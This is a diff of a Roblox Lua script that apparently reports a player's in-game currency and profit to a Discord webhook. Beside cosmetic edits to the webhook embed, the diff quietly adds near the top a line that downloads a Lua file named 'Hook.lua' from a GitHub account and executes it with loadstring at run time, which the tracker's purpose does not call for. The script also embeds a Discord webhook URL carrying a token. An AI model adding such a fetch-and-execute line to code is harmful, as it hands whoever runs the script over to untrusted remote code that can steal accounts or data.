@@ -2,7 +2,7 @@
 local Profit = game.Players.LocalPlayer.DataFolder.Currency.Value
 local Tick = os.time()
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mrhackerman35297/Data/main/Hook.lua"))()
 
 local money = function(Num)
 	return tostring(Num):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
@@ -39,13 +39,10 @@ local url = "https://discord.com/api/webhooks/1137541903143948288/ePJDY-d2JIXqyw
                     },
                     {
                         ["name"] = "Credits:",
-                        ["value"] = '```9kDestroyer | giba niba```',
+                        ["value"] = '9kDestroyer | giba niba',
                         ["inline"] = false,
                     },
                 }, 
-                ["thumbnail"] = {
-                    ["url"] = 'https://media.discordapp.net/attachments/862465771053907999/863897814789259284/unknown_15.png?ex=6591e009&is=657f6b09&hm=4aa6c9bf67afcb31a35bc3429f2c845670f53838dbb4c2d60e86a5ef83d257fb&=&format=webp&quality=lossless',
-                }
             }
         }
     }
